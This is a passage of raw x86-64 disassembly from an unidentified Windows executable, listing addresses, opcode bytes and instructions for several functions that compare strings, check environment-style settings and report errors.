   1400034d7:	83 f8 01             	cmp    $0x1,%eax
   1400034da:	75 3e                	jne    0x14000351a
   1400034dc:	48 8b 8d 18 20 00 00 	mov    0x2018(%rbp),%rcx
   1400034e3:	48 85 c9             	test   %rcx,%rcx
   1400034e6:	74 11                	je     0x1400034f9
   1400034e8:	48 8b d6             	mov    %rsi,%rdx
   1400034eb:	e8 30 3c 00 00       	call   0x140007120
   1400034f0:	83 f8 01             	cmp    $0x1,%eax
   1400034f3:	0f 84 b3 00 00 00    	je     0x1400035ac
   1400034f9:	48 8d 94 24 d0 00 00 	lea    0xd0(%rsp),%rdx
   140003500:	00 
   140003501:	48 8d 0d a0 88 02 00 	lea    0x288a0(%rip),%rcx        # 0x14002bda8
   140003508:	44 38 b5 31 30 00 00 	cmp    %r14b,0x3031(%rbp)
   14000350f:	0f 85 b4 00 00 00    	jne    0x1400035c9
   140003515:	e8 36 f5 ff ff       	call   0x140002a50
   14000351a:	4c 8b c6             	mov    %rsi,%r8
   14000351d:	48 8d 95 22 20 00 00 	lea    0x2022(%rbp),%rdx
   140003524:	48 8b cd             	mov    %rbp,%rcx
   140003527:	e8 f4 48 00 00       	call   0x140007e20
   14000352c:	85 c0                	test   %eax,%eax
   14000352e:	0f 88 ae 00 00 00    	js     0x1400035e2
   140003534:	80 7f 11 64          	cmpb   $0x64,0x11(%rdi)
   140003538:	75 59                	jne    0x140003593
   14000353a:	48 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%rax
   140003541:	00 
   140003542:	48 8b cd             	mov    %rbp,%rcx
   140003545:	4c 8d 8c 24 d0 10 00 	lea    0x10d0(%rsp),%r9
   14000354c:	00 
   14000354d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003552:	4c 8d 84 24 d0 20 00 	lea    0x20d0(%rsp),%r8
   140003559:	00 
   14000355a:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000355f:	e8 2c 0c 00 00       	call   0x140004190
   140003564:	eb 40                	jmp    0x1400035a6
   140003566:	4c 8d 47 12          	lea    0x12(%rdi),%r8
   14000356a:	48 8d 94 24 d0 10 00 	lea    0x10d0(%rsp),%rdx
   140003571:	00 
   140003572:	48 8d 8c 24 d0 20 00 	lea    0x20d0(%rsp),%rcx
   140003579:	00 
   14000357a:	e8 d1 0e 00 00       	call   0x140004450
   14000357f:	41 3b c4             	cmp    %r12d,%eax
   140003582:	48 8d b4 24 d0 10 00 	lea    0x10d0(%rsp),%rsi
   140003589:	00 
   14000358a:	41 0f 44 dc          	cmove  %r12d,%ebx
   14000358e:	e9 e3 fe ff ff       	jmp    0x140003476
   140003593:	4c 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%r8
   14000359a:	00 
   14000359b:	48 8b d7             	mov    %rdi,%rdx
   14000359e:	49 8b cd             	mov    %r13,%rcx
   1400035a1:	e8 5a e0 ff ff       	call   0x140001600
   1400035a6:	8b d8                	mov    %eax,%ebx
   1400035a8:	85 c0                	test   %eax,%eax
   1400035aa:	75 24                	jne    0x1400035d0
   1400035ac:	48 8b d7             	mov    %rdi,%rdx
   1400035af:	49 8b cd             	mov    %r13,%rcx
   1400035b2:	e8 89 e3 ff ff       	call   0x140001940
   1400035b7:	48 8b f8             	mov    %rax,%rdi
   1400035ba:	49 3b 85 10 10 00 00 	cmp    0x1010(%r13),%rax
   1400035c1:	0f 82 89 fe ff ff    	jb     0x140003450
   1400035c7:	eb 31                	jmp    0x1400035fa
   1400035c9:	e8 42 f1 ff ff       	call   0x140002710
   1400035ce:	eb 27                	jmp    0x1400035f7
   1400035d0:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   1400035d4:	48 8d 0d 25 88 02 00 	lea    0x28825(%rip),%rcx        # 0x14002be00
   1400035db:	e8 30 f1 ff ff       	call   0x140002710
   1400035e0:	eb 18                	jmp    0x1400035fa
   1400035e2:	48 8d 0d e7 87 02 00 	lea    0x287e7(%rip),%rcx        # 0x14002bdd0
   1400035e9:	eb 07                	jmp    0x1400035f2
   1400035eb:	48 8d 0d 7e 87 02 00 	lea    0x2877e(%rip),%rcx        # 0x14002bd70
   1400035f2:	e8 19 f1 ff ff       	call   0x140002710
   1400035f7:	41 8b dc             	mov    %r12d,%ebx
   1400035fa:	48 8b b4 24 20 31 00 	mov    0x3120(%rsp),%rsi
   140003601:	00 
   140003602:	4c 8b bc 24 e0 30 00 	mov    0x30e0(%rsp),%r15
   140003609:	00 
   14000360a:	4c 8b a4 24 f0 30 00 	mov    0x30f0(%rsp),%r12
   140003611:	00 
   140003612:	4c 8b ac 24 e8 30 00 	mov    0x30e8(%rsp),%r13
   140003619:	00 
   14000361a:	48 8b bc 24 28 31 00 	mov    0x3128(%rsp),%rdi
   140003621:	00 
   140003622:	48 8b ac 24 18 31 00 	mov    0x3118(%rsp),%rbp
   140003629:	00 
   14000362a:	4c 39 74 24 30       	cmp    %r14,0x30(%rsp)
   14000362f:	74 21                	je     0x140003652
   140003631:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140003636:	48 8b c8             	mov    %rax,%rcx
   140003639:	e8 c2 e2 ff ff       	call   0x140001900
   14000363e:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140003643:	4d 8d 76 01          	lea    0x1(%r14),%r14
   140003647:	4a 83 3c f0 00       	cmpq   $0x0,(%rax,%r14,8)
   14000364c:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003650:	75 e4                	jne    0x140003636
   140003652:	8b c3                	mov    %ebx,%eax
   140003654:	48 8b 8c 24 d0 30 00 	mov    0x30d0(%rsp),%rcx
   14000365b:	00 
   14000365c:	48 33 cc             	xor    %rsp,%rcx
   14000365f:	e8 ec 8e 00 00       	call   0x14000c550
   140003664:	48 81 c4 f8 30 00 00 	add    $0x30f8,%rsp
   14000366b:	41 5e                	pop    %r14
   14000366d:	5b                   	pop    %rbx
   14000366e:	c3                   	ret
   14000366f:	cc                   	int3
   140003670:	40 53                	rex push %rbx
   140003672:	48 83 ec 20          	sub    $0x20,%rsp
   140003676:	48 8b d9             	mov    %rcx,%rbx
   140003679:	e8 92 29 00 00       	call   0x140006010
   14000367e:	48 8b 8b 28 30 00 00 	mov    0x3028(%rbx),%rcx
   140003685:	48 85 c9             	test   %rcx,%rcx
   140003688:	74 10                	je     0x14000369a
   14000368a:	e8 d1 57 00 00       	call   0x140008e60
   14000368f:	48 c7 83 28 30 00 00 	movq   $0x0,0x3028(%rbx)
   140003696:	00 00 00 00 
   14000369a:	48 83 c4 20          	add    $0x20,%rsp
   14000369e:	5b                   	pop    %rbx
   14000369f:	c3                   	ret
   1400036a0:	c2 00 00             	ret    $0x0
   1400036a3:	cc                   	int3
   1400036a4:	cc                   	int3
   1400036a5:	cc                   	int3
   1400036a6:	cc                   	int3
   1400036a7:	cc                   	int3
   1400036a8:	cc                   	int3
   1400036a9:	cc                   	int3
   1400036aa:	cc                   	int3
   1400036ab:	cc                   	int3
   1400036ac:	cc                   	int3
   1400036ad:	cc                   	int3
   1400036ae:	cc                   	int3
   1400036af:	cc                   	int3
   1400036b0:	40 53                	rex push %rbx
   1400036b2:	b8 30 40 00 00       	mov    $0x4030,%eax
   1400036b7:	e8 94 91 00 00       	call   0x14000c850
   1400036bc:	48 2b e0             	sub    %rax,%rsp
   1400036bf:	48 8b 05 7a a9 03 00 	mov    0x3a97a(%rip),%rax        # 0x14003e040
   1400036c6:	48 33 c4             	xor    %rsp,%rax
   1400036c9:	48 89 84 24 20 40 00 	mov    %rax,0x4020(%rsp)
   1400036d0:	00 
   1400036d1:	48 8b d9             	mov    %rcx,%rbx
   1400036d4:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400036d9:	33 c9                	xor    %ecx,%ecx
   1400036db:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400036e1:	ff 15 f1 79 02 00    	call   *0x279f1(%rip)        # 0x14002b0d8
   1400036e7:	85 c0                	test   %eax,%eax
   1400036e9:	75 25                	jne    0x140003710
   1400036eb:	ff 15 df 79 02 00    	call   *0x279df(%rip)        # 0x14002b0d0
   1400036f1:	8b d0                	mov    %eax,%edx
   1400036f3:	4c 8d 05 36 8c 02 00 	lea    0x28c36(%rip),%r8        # 0x14002c330
   1400036fa:	48 8d 0d 77 8c 02 00 	lea    0x28c77(%rip),%rcx        # 0x14002c378
   140003701:	e8 4a f5 ff ff       	call   0x140002c50
   140003706:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000370b:	e9 95 00 00 00       	jmp    0x1400037a5
   140003710:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003715:	e8 66 5b 00 00       	call   0x140009280
   14000371a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000371f:	85 c0                	test   %eax,%eax
   140003721:	74 5a                	je     0x14000377d
   140003723:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   14000372a:	00 
   14000372b:	e8 d0 5b 00 00       	call   0x140009300
   140003730:	85 c0                	test   %eax,%eax
   140003732:	79 18                	jns    0x14000374c
   140003734:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003739:	48 8d 0d 60 8c 02 00 	lea    0x28c60(%rip),%rcx        # 0x14002c3a0
   140003740:	e8 cb f0 ff ff       	call   0x140002810
   140003745:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000374a:	eb 59                	jmp    0x1400037a5
   14000374c:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140003752:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   140003759:	00 
   14000375a:	48 8d 0d 9f 8c 02 00 	lea    0x28c9f(%rip),%rcx        # 0x14002c400
   140003761:	e8 a2 1a 01 00       	call   0x140015208
   140003766:	33 d2                	xor    %edx,%edx
   140003768:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000376d:	85 c0                	test   %eax,%eax
   14000376f:	48 8d 84 24 20 20 00 	lea    0x2020(%rsp),%rax
   140003776:	00 
   140003777:	0f 45 ca             	cmovne %edx,%ecx
   14000377a:	48 03 c8             	add    %rax,%rcx
   14000377d:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003783:	48 8b d3             	mov    %rbx,%rdx
   140003786:	e8 b5 5c 00 00       	call   0x140009440
   14000378b:	48 85 c0             	test   %rax,%rax
   14000378e:	75 13                	jne    0x1400037a3
   140003790:	48 8d 0d 79 8c 02 00 	lea    0x28c79(%rip),%rcx        # 0x14002c410
   140003797:	e8 74 f0 ff ff       	call   0x140002810
   14000379c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400037a1:	eb 02                	jmp    0x1400037a5
   1400037a3:	33 c0                	xor    %eax,%eax
   1400037a5:	48 8b 8c 24 20 40 00 	mov    0x4020(%rsp),%rcx
   1400037ac:	00 
   1400037ad:	48 33 cc             	xor    %rsp,%rcx
   1400037b0:	e8 9b 8d 00 00       	call   0x14000c550
   1400037b5:	48 81 c4 30 40 00 00 	add    $0x4030,%rsp
   1400037bc:	5b                   	pop    %rbx
   1400037bd:	c3                   	ret
   1400037be:	cc                   	int3
   1400037bf:	cc                   	int3
   1400037c0:	40 55                	rex push %rbp
   1400037c2:	57                   	push   %rdi
   1400037c3:	41 54                	push   %r12
   1400037c5:	b8 80 20 00 00       	mov    $0x2080,%eax
   1400037ca:	e8 81 90 00 00       	call   0x14000c850
   1400037cf:	48 2b e0             	sub    %rax,%rsp
   1400037d2:	48 8b 05 67 a8 03 00 	mov    0x3a867(%rip),%rax        # 0x14003e040
   1400037d9:	48 33 c4             	xor    %rsp,%rax
   1400037dc:	48 89 84 24 60 20 00 	mov    %rax,0x2060(%rsp)
   1400037e3:	00 
   1400037e4:	48 8b f9             	mov    %rcx,%rdi
   1400037e7:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400037ec:	e8 ff 1b 01 00       	call   0x1400153f0
   1400037f1:	48 8b c8             	mov    %rax,%rcx
   1400037f4:	33 d2                	xor    %edx,%edx
   1400037f6:	e8 89 1c 01 00       	call   0x140015484
   1400037fb:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   1400037ff:	e8 ac fe ff ff       	call   0x1400036b0
   140003804:	85 c0                	test   %eax,%eax
   140003806:	79 0c                	jns    0x140003814
   140003808:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   14000380f:	e9 83 04 00 00       	jmp    0x140003c97
   140003814:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140003818:	48 89 9c 24 a8 20 00 	mov    %rbx,0x20a8(%rsp)
   14000381f:	00 
   140003820:	e8 2b e1 ff ff       	call   0x140001950
   140003825:	48 89 87 10 20 00 00 	mov    %rax,0x2010(%rdi)
   14000382c:	48 c7 c5 ff ff ff ff 	mov    $0xffffffffffffffff,%rbp
   140003833:	48 85 c0             	test   %rax,%rax
   140003836:	0f 84 df 00 00 00    	je     0x14000391b
   14000383c:	48 8d 9f 10 10 00 00 	lea    0x1010(%rdi),%rbx
   140003843:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003848:	48 8b cb             	mov    %rbx,%rcx
   14000384b:	4c 8d 4f 10          	lea    0x10(%rdi),%r9
   14000384f:	4c 8d 05 26 82 02 00 	lea    0x28226(%rip),%r8        # 0x14002ba7c
   140003856:	e8 25 e4 ff ff       	call   0x140001c80
   14000385b:	48 8b 87 10 20 00 00 	mov    0x2010(%rdi),%rax
   140003862:	48 89 b4 24 b0 20 00 	mov    %rsi,0x20b0(%rsp)
   140003869:	00 
   14000386a:	40 32 f6             	xor    %sil,%sil
   14000386d:	4c 89 b4 24 78 20 00 	mov    %r14,0x2078(%rsp)
   140003874:	00 
   140003875:	0f b6 88 18 10 00 00 	movzbl 0x1018(%rax),%ecx
   14000387c:	88 8f 20 20 00 00    	mov    %cl,0x2020(%rdi)
   140003882:	48 8d 0d ff 86 02 00 	lea    0x286ff(%rip),%rcx        # 0x14002bf88
   140003889:	e8 a2 4f 00 00       	call   0x140008830
   14000388e:	4c 8b f0             	mov    %rax,%r14
   140003891:	b9 31 00 00 00       	mov    $0x31,%ecx
   140003896:	33 c0                	xor    %eax,%eax
   140003898:	4d 85 f6             	test   %r14,%r14
   14000389b:	74 24                	je     0x1400038c1
   14000389d:	41 0f b6 36          	movzbl (%r14),%esi
   1400038a1:	2b f1                	sub    %ecx,%esi
   1400038a3:	75 0a                	jne    0x1400038af
   1400038a5:	41 0f b6 76 01       	movzbl 0x1(%r14),%esi
   1400038aa:	0f b6 c0             	movzbl %al,%eax
   1400038ad:	2b f0                	sub    %eax,%esi
   1400038af:	48 8d 0d d2 86 02 00 	lea    0x286d2(%rip),%rcx        # 0x14002bf88
   1400038b6:	e8 e5 50 00 00       	call   0x1400089a0
   1400038bb:	85 f6                	test   %esi,%esi
   1400038bd:	40 0f 94 c6          	sete   %sil
   1400038c1:	49 8b ce             	mov    %r14,%rcx
   1400038c4:	e8 67 16 01 00       	call   0x140014f30
   1400038c9:	40 84 f6             	test   %sil,%sil
   1400038cc:	0f 85 2a 01 00 00    	jne    0x1400039fc
   1400038d2:	48 8d 0d d7 86 02 00 	lea    0x286d7(%rip),%rcx        # 0x14002bfb0
   1400038d9:	e8 52 4f 00 00       	call   0x140008830
   1400038de:	48 85 c0             	test   %rax,%rax
   1400038e1:	0f 84 0d 01 00 00    	je     0x1400039f4
   1400038e7:	4c 8b c8             	mov    %rax,%r9
   1400038ea:	48 8b cb             	mov    %rbx,%rcx
   1400038ed:	4c 2b cb             	sub    %rbx,%r9
   1400038f0:	44 0f b6 01          	movzbl (%rcx),%r8d
   1400038f4:	42 0f b6 14 09       	movzbl (%rcx,%r9,1),%edx
   1400038f9:	44 2b c2             	sub    %edx,%r8d
   1400038fc:	75 07                	jne    0x140003905
   1400038fe:	48 ff c1             	inc    %rcx
   140003901:	85 d2                	test   %edx,%edx
   140003903:	75 eb                	jne    0x1400038f0
   140003905:	45 85 c0             	test   %r8d,%r8d
   140003908:	0f 85 e6 00 00 00    	jne    0x1400039f4
   14000390e:	48 8b c8             	mov    %rax,%rcx
   140003911:	e8 1a 16 01 00       	call   0x140014f30
   140003916:	e9 14 01 00 00       	jmp    0x140003a2f
   14000391b:	48 8d 15 a2 7f 02 00 	lea    0x27fa2(%rip),%rdx        # 0x14002b8c4
   140003922:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140003926:	e8 95 0c 00 00       	call   0x1400045c0
   14000392b:	48 8b d8             	mov    %rax,%rbx
   14000392e:	48 85 c0             	test   %rax,%rax
   140003931:	74 37                	je     0x14000396a
   140003933:	48 8b 0d fe 9b 02 00 	mov    0x29bfe(%rip),%rcx        # 0x14002d538
   14000393a:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000393f:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   140003944:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000394a:	48 c1 e9 18          	shr    $0x18,%rcx
   14000394e:	80 c1 0d             	add    $0xd,%cl
   140003951:	88 4c 24 53          	mov    %cl,0x53(%rsp)
   140003955:	48 8b c8             	mov    %rax,%rcx
   140003958:	e8 33 46 00 00       	call   0x140007f90
   14000395d:	48 85 c0             	test   %rax,%rax
   140003960:	75 22                	jne    0x140003984
   140003962:	48 8b cb             	mov    %rbx,%rcx
   140003965:	e8 e2 c6 00 00       	call   0x14001004c
   14000396a:	48 8d 5f 10          	lea    0x10(%rdi),%rbx
   14000396e:	48 8b d3             	mov    %rbx,%rdx
   140003971:	48 8d 0d f8 8a 02 00 	lea    0x28af8(%rip),%rcx        # 0x14002c470
   140003978:	e8 93 ed ff ff       	call   0x140002710
   14000397d:	8b c5                	mov    %ebp,%eax
   14000397f:	e9 0b 03 00 00       	jmp    0x140003c8f
   140003984:	48 8d 9f 10 10 00 00 	lea    0x1010(%rdi),%rbx
   14000398b:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003990:	48 8b cb             	mov    %rbx,%rcx
   140003993:	4c 8d 4f 10          	lea    0x10(%rdi),%r9
   140003997:	4c 8d 05 de 80 02 00 	lea    0x280de(%rip),%r8        # 0x14002ba7c
   14000399e:	e8 dd e2 ff ff       	call   0x140001c80
   1400039a3:	48 8b c5             	mov    %rbp,%rax
   1400039a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400039ad:	00 00 00 
   1400039b0:	80 7c 03 01 00       	cmpb   $0x0,0x1(%rbx,%rax,1)
   1400039b5:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400039b9:	75 f5                	jne    0x1400039b0
   1400039bb:	48 8b cb             	mov    %rbx,%rcx
   1400039be:	c7 84 38 0d 10 00 00 	movl   $0x676b70,0x100d(%rax,%rdi,1)
   1400039c5:	70 6b 67 00 
   1400039c9:	e8 82 df ff ff       	call   0x140001950
   1400039ce:	48 89 87 10 20 00 00 	mov    %rax,0x2010(%rdi)
   1400039d5:	48 85 c0             	test   %rax,%rax
   1400039d8:	0f 85 7d fe ff ff    	jne    0x14000385b
   1400039de:	48 8d 0d db 8a 02 00 	lea    0x28adb(%rip),%rcx        # 0x14002c4c0
   1400039e5:	48 8b d3             	mov    %rbx,%rdx
   1400039e8:	e8 23 ed ff ff       	call   0x140002710
   1400039ed:	8b c5                	mov    %ebp,%eax
   1400039ef:	e9 9b 02 00 00       	jmp    0x140003c8f
   1400039f4:	48 8b c8             	mov    %rax,%rcx
   1400039f7:	e8 34 15 01 00       	call   0x140014f30
   1400039fc:	48 8b d3             	mov    %rbx,%rdx
   1400039ff:	48 8d 0d aa 85 02 00 	lea    0x285aa(%rip),%rcx        # 0x14002bfb0
   140003a06:	e8 35 4f 00 00       	call   0x140008940
   140003a0b:	48 8d 0d b6 85 02 00 	lea    0x285b6(%rip),%rcx        # 0x14002bfc8
   140003a12:	e8 89 4f 00 00       	call   0x1400089a0
   140003a17:	48 8d 0d ca 85 02 00 	lea    0x285ca(%rip),%rcx        # 0x14002bfe8
   140003a1e:	e8 7d 4f 00 00       	call   0x1400089a0
   140003a23:	48 8d 0d de 85 02 00 	lea    0x285de(%rip),%rcx        # 0x14002c008
   140003a2a:	e8 71 4f 00 00       	call   0x1400089a0
   140003a2f:	48 8d 0d b2 85 02 00 	lea    0x285b2(%rip),%rcx        # 0x14002bfe8
   140003a36:	e8 f5 4d 00 00       	call   0x140008830
   140003a3b:	48 85 c0             	test   %rax,%rax
   140003a3e:	0f 84 01 01 00 00    	je     0x140003b45
   140003a44:	80 38 00             	cmpb   $0x0,(%rax)
   140003a47:	0f 84 f8 00 00 00    	je     0x140003b45
   140003a4d:	80 38 30             	cmpb   $0x30,(%rax)
   140003a50:	0f 85 be 00 00 00    	jne    0x140003b14
   140003a56:	80 78 01 00          	cmpb   $0x0,0x1(%rax)
   140003a5a:	0f 85 b4 00 00 00    	jne    0x140003b14
   140003a60:	4c 8d b7 21 20 00 00 	lea    0x2021(%rdi),%r14
   140003a67:	41 c6 06 01          	movb   $0x1,(%r14)
   140003a6b:	4c 89 ac 24 b8 20 00 	mov    %r13,0x20b8(%rsp)
   140003a72:	00 
   140003a73:	48 8b c8             	mov    %rax,%rcx
   140003a76:	4c 89 bc 24 70 20 00 	mov    %r15,0x2070(%rsp)
   140003a7d:	00 
   140003a7e:	e8 ad 14 01 00       	call   0x140014f30
   140003a83:	41 0f b6 06          	movzbl (%r14),%eax
   140003a87:	4c 8d 2d 8a 85 02 00 	lea    0x2858a(%rip),%r13        # 0x14002c018
   140003a8e:	3c 02                	cmp    $0x2,%al
   140003a90:	73 19                	jae    0x140003aab
   140003a92:	84 c0                	test   %al,%al
   140003a94:	48 8d 15 0d 85 02 00 	lea    0x2850d(%rip),%rdx        # 0x14002bfa8
   140003a9b:	48 8d 0d 46 85 02 00 	lea    0x28546(%rip),%rcx        # 0x14002bfe8
   140003aa2:	49 0f 44 d5          	cmove  %r13,%rdx
   140003aa6:	e8 95 4e 00 00       	call   0x140008940
   140003aab:	4c 8b bf 10 20 00 00 	mov    0x2010(%rdi),%r15
   140003ab2:	49 8b 9f 08 10 00 00 	mov    0x1008(%r15),%rbx
   140003ab9:	49 3b 9f 10 10 00 00 	cmp    0x1010(%r15),%rbx
   140003ac0:	0f 83 22 01 00 00    	jae    0x140003be8
   140003ac6:	80 7b 11 6f          	cmpb   $0x6f,0x11(%rbx)
   140003aca:	0f 85 fd 00 00 00    	jne    0x140003bcd
   140003ad0:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   140003ad6:	48 8d 15 bb 86 02 00 	lea    0x286bb(%rip),%rdx        # 0x14002c198
   140003add:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003ae1:	e8 6a 17 01 00       	call   0x140015250
   140003ae6:	85 c0                	test   %eax,%eax
   140003ae8:	75 78                	jne    0x140003b62
   140003aea:	48 8d 4b 22          	lea    0x22(%rbx),%rcx
   140003aee:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   140003af4:	48 8d 15 ad 86 02 00 	lea    0x286ad(%rip),%rdx        # 0x14002c1a8
   140003afb:	e8 50 17 01 00       	call   0x140015250
   140003b00:	85 c0                	test   %eax,%eax
   140003b02:	0f 85 c5 00 00 00    	jne    0x140003bcd
   140003b08:	c6 87 79 30 00 00 01 	movb   $0x1,0x3079(%rdi)
   140003b0f:	e9 b9 00 00 00       	jmp    0x140003bcd
   140003b14:	80 38 31             	cmpb   $0x31,(%rax)
   140003b17:	75 16                	jne    0x140003b2f
   140003b19:	80 78 01 00          	cmpb   $0x0,0x1(%rax)
   140003b1d:	75 10                	jne    0x140003b2f
   140003b1f:	4c 8d b7 21 20 00 00 	lea    0x2021(%rdi),%r14
   140003b26:	41 c6 06 02          	movb   $0x2,(%r14)
   140003b2a:	e9 3c ff ff ff       	jmp    0x140003a6b
   140003b2f:	48 8b d0             	mov    %rax,%rdx
   140003b32:	48 8d 0d e7 84 02 00 	lea    0x284e7(%rip),%rcx        # 0x14002c020
   140003b39:	e8 d2 eb ff ff       	call   0x140002710
   140003b3e:	8b c5                	mov    %ebp,%eax
   140003b40:	e9 3a 01 00 00       	jmp    0x140003c7f
   140003b45:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003b4c:	4c 8d b7 21 20 00 00 	lea    0x2021(%rdi),%r14
   140003b53:	0f 84 0e ff ff ff    	je     0x140003a67
   140003b59:	41 c6 06 00          	movb   $0x0,(%r14)
   140003b5d:	e9 09 ff ff ff       	jmp    0x140003a6b
   140003b62:	41 b8 12 00 00 00    	mov    $0x12,%r8d
   140003b68:	48 8d 15 49 86 02 00 	lea    0x28649(%rip),%rdx        # 0x14002c1b8
   140003b6f:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003b73:	e8 d8 16 01 00       	call   0x140015250
   140003b78:	85 c0                	test   %eax,%eax
   140003b7a:	75 0b                	jne    0x140003b87
   140003b7c:	48 8d 43 25          	lea    0x25(%rbx),%rax
   140003b80:	48 89 87 68 30 00 00 	mov    %rax,0x3068(%rdi)
   140003b87:	41 b8 16 00 00 00    	mov    $0x16,%r8d
   140003b8d:	48 8d 15 3c 86 02 00 	lea    0x2863c(%rip),%rdx        # 0x14002c1d0
   140003b94:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003b98:	e8 b3 16 01 00       	call   0x140015250
   140003b9d:	85 c0                	test   %eax,%eax
   140003b9f:	75 0b                	jne    0x140003bac
   140003ba1:	48 8d 43 29          	lea    0x29(%rbx),%rax
   140003ba5:	48 89 87 70 30 00 00 	mov    %rax,0x3070(%rdi)
   140003bac:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   140003bb2:	48 8d 15 2f 86 02 00 	lea    0x2862f(%rip),%rdx        # 0x14002c1e8
   140003bb9:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003bbd:	e8 8e 16 01 00       	call   0x140015250
   140003bc2:	85 c0                	test   %eax,%eax
   140003bc4:	75 07                	jne    0x140003bcd
   140003bc6:	c6 87 78 30 00 00 01 	movb   $0x1,0x3078(%rdi)
   140003bcd:	48 8b d3             	mov    %rbx,%rdx
   140003bd0:	49 8b cf             	mov    %r15,%rcx
   140003bd3:	e8 68 dd ff ff       	call   0x140001940
   140003bd8:	48 8b d8             	mov    %rax,%rbx
   140003bdb:	49 3b 87 10 10 00 00 	cmp    0x1010(%r15),%rax
   140003be2:	0f 82 de fe ff ff    	jb     0x140003ac6
   140003be8:	48 8d 0d 61 84 02 00 	lea    0x28461(%rip),%rcx        # 0x14002c050
   140003bef:	e8 3c 4c 00 00       	call   0x140008830
   140003bf4:	4c 8b c0             	mov    %rax,%r8
   140003bf7:	48 85 c0             	test   %rax,%rax
   140003bfa:	74 32                	je     0x140003c2e
   140003bfc:	0f b6 10             	movzbl (%rax),%edx
   140003bff:	83 ea 30             	sub    $0x30,%edx
   140003c02:	75 1a                	jne    0x140003c1e
   140003c04:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   140003c08:	45 33 ff             	xor    %r15d,%r15d
   140003c0b:	41 0f b6 cf          	movzbl %r15b,%ecx
   140003c0f:	2b d1                	sub    %ecx,%edx
   140003c11:	85 d2                	test   %edx,%edx
   140003c13:	0f 95 c0             	setne  %al
   140003c16:	88 87 31 30 00 00    	mov    %al,0x3031(%rdi)
   140003c1c:	eb 13                	jmp    0x140003c31
   140003c1e:	45 33 ff             	xor    %r15d,%r15d
   140003c21:	85 d2                	test   %edx,%edx
   140003c23:	0f 95 c0             	setne  %al
   140003c26:	88 87 31 30 00 00    	mov    %al,0x3031(%rdi)
   140003c2c:	eb 03                	jmp    0x140003c31
   140003c2e:	45 33 ff             	xor    %r15d,%r15d
   140003c31:	49 8b c8             	mov    %r8,%rcx
   140003c34:	e8 f7 12 01 00       	call   0x140014f30
   140003c39:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003c40:	0f 84 fb 00 00 00    	je     0x140003d41
   140003c46:	41 80 3e 00          	cmpb   $0x0,(%r14)
   140003c4a:	0f 85 84 00 00 00    	jne    0x140003cd4
   140003c50:	e8 8b 54 00 00       	call   0x1400090e0
   140003c55:	48 89 87 38 30 00 00 	mov    %rax,0x3038(%rdi)
   140003c5c:	48 85 c0             	test   %rax,%rax
   140003c5f:	75 52                	jne    0x140003cb3
   140003c61:	48 8d 0d 08 84 02 00 	lea    0x28408(%rip),%rcx        # 0x14002c070
   140003c68:	e8 a3 ea ff ff       	call   0x140002710
   140003c6d:	8b c5                	mov    %ebp,%eax
   140003c6f:	4c 8b ac 24 b8 20 00 	mov    0x20b8(%rsp),%r13
   140003c76:	00 
   140003c77:	4c 8b bc 24 70 20 00 	mov    0x2070(%rsp),%r15
   140003c7e:	00 
   140003c7f:	48 8b b4 24 b0 20 00 	mov    0x20b0(%rsp),%rsi
   140003c86:	00 
   140003c87:	4c 8b b4 24 78 20 00 	mov    0x2078(%rsp),%r14
   140003c8e:	00 
   140003c8f:	48 8b 9c 24 a8 20 00 	mov    0x20a8(%rsp),%rbx
   140003c96:	00 
   140003c97:	48 8b 8c 24 60 20 00 	mov    0x2060(%rsp),%rcx
   140003c9e:	00 
   140003c9f:	48 33 cc             	xor    %rsp,%rcx
   140003ca2:	e8 a9 88 00 00       	call   0x14000c550
   140003ca7:	48 81 c4 80 20 00 00 	add    $0x2080,%rsp
   140003cae:	41 5c                	pop    %r12
   140003cb0:	5f                   	pop    %rdi
   140003cb1:	5d                   	pop    %rbp
   140003cb2:	c3                   	ret
   140003cb3:	48 8b cf             	mov    %rdi,%rcx
   140003cb6:	e8 a5 49 00 00       	call   0x140008660
   140003cbb:	85 c0                	test   %eax,%eax
   140003cbd:	79 09                	jns    0x140003cc8
